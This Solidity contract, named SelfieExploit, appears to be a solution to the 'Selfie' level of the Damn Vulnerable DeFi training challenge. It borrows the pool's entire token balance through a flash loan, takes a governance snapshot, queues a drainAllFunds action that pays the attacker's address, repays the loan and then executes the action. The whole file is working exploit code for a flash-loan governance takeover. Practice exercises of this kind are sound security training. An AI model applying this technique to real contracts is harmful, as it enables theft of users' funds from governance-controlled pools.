// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";


contract SelfieExploit {
	using Address for address;

	SelfiePool public selfiePool;
	SimpleGovernance public governance;
	address public attackerEOA;
	uint256 public actionId;
	
	
    constructor(address selfiePoolAddress, address governanceAddress) {
        selfiePool = SelfiePool(selfiePoolAddress);
		governance = SimpleGovernance(governanceAddress);
		attackerEOA = msg.sender;
    }
    
	function setupAttack() external {
		uint256 amount = selfiePool.token().balanceOf(address(selfiePool));

		DamnValuableTokenSnapshot(address(selfiePool.token())).snapshot();
		selfiePool.flashLoan(amount);
	}
	function receiveTokens(address token, uint256 amount) external {
		DamnValuableTokenSnapshot(address(selfiePool.token())).snapshot();
		actionId = governance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", attackerEOA), 0);
		
		IERC20(token).transfer(address(selfiePool), amount);
	}
	
	function attack() external {
	
		governance.executeAction(actionId);
	}
}



/**

 ISelfie:: drainAllFunds(address receiver) external onlyGovernance
 

**/
